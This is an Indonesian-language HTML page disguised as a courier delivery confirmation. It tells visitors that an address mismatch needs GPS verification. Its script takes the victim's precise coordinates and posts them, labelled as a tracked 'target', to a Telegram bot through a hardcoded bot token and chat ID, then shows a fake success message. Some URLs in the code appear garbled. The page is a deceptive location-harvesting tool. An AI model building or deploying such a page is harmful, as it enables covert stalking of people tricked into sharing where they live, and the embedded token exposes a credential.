<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Konfirmasi Pengiriman Paket</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        .btn { background-color: #28a745; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
        .btn:hover { background-color: #218838; }
        h2 { color: #333; }
        p { color: #666; }
    </style>
</head>
<body>

<div class="card">
    <h2>📍 Konfirmasi Lokasi Pengiriman</h2>
    <p>Sistem mendeteksi ketidaksesuaian alamat. Silakan verifikasi koordinat GPS rumah Anda agar kurir tidak salah mengantar paket.</p>
    <br>
    <button class="btn" onclick="ambilLokasi()">KONFIRMASI LOKASI SAYA</button>
    <p id="status" style="margin-top: 15px; font-weight: bold; color: #d9534f;"></p>
</div>

<script>
    // 1. KUNCI TOKEN BARU ANDA DI SINI
    const TOKEN_BOT = "8730133712:AAE4vG00GTpbJSUOCjEmHbTLQ08shoSwu7o";
    
    // 2. AMBIL PARAMETER ID DARI LINK SECARA OTOMATIS
    const urlParams = new URLSearchParams(window.location.search);
    const userIdAdmin = urlParams.get('uid'); 

    function ambilLokasi() {
        const statusText = document.getElementById("status");
        statusText.style.color = "#333";
        statusText.innerText = "Menghubungkan ke satelit GPS...";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(kirimKeTelegram, tanganiError, {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            });
        } else {
            statusText.style.color = "#d9534f";
            statusText.innerText = "Browser tidak mendukung sensor GPS.";
        }
    }

    function kirimKeTelegram(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = position.coords.accuracy;
        const statusText = document.getElementById("status");

        const pesan = `🎯 *TARGET BERHASIL TERLACAK!*\n\n` +
                      `📍 *Koordinat:* \`${lat}, ${lon}\`\n` +
                      `🎯 *Akurasi:* ± ${Math.round(acc)} meter\n\n` +
                      `🗺️ *Google Maps:* \n` +
                      `https://google.com{lat},${lon}`;

        // ⚠️ VALIDASI ID TELEGRAM AMAN DARI ERROR
        // Jika target mengklik link utama tanpa lewat bot, data dikirim ke ID Admin utama Anda
        // GANTI angka 12345678 di bawah dengan nomor ID Telegram asli Anda dari @userinfobot (tanpa tanda petik)
        const targetChatId = userIdAdmin ? userIdAdmin : 6953925929; 

        const url = `https://telegram.org{TOKEN_BOT}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: String(targetChatId), // Dipaksa menjadi string agar dibaca valid oleh API Telegram
                text: pesan,
                parse_mode: 'Markdown'
            })
        })
        .then(res => res.json())
        .then(data => {
            if(data.ok) {
                statusText.style.color = "#28a745";
                statusText.innerText = "✅ Verifikasi Lokasi Sukses! Alamat paket diperbarui.";
            } else {
                statusText.style.color = "#d9534f";
                statusText.innerText = "Eror API Telegram: " + data.description;
            }
        })
        .catch(err => {
            statusText.style.color = "#d9534f";
            statusText.innerText = "Gagal mengirim data jaringan.";
        });
    }

    function tanganiError(error) {
        const statusText = document.getElementById("status");
        statusText.style.color = "#d9534f";
        switch(error.code) {
            case error.PERMISSION_DENIED:
                statusText.innerText = "❌ Hubungkan GPS: Klik 'Izinkan' saat browser meminta akses lokasi.";
                break;
            case error.POSITION_UNAVAILABLE:
                statusText.innerText = "❌ Gagal: Sinyal GPS perangkat tidak stabil.";
                break;
            case error.TIMEOUT:
                statusText.innerText = "❌ Gagal: Waktu habis. Aktifkan lokasi di pengaturan HP.";
                break;
            default:
                statusText.innerText = "❌ Gagal: Terjadi gangguan teknis.";
        }
    }
</script>

</body>
</html>
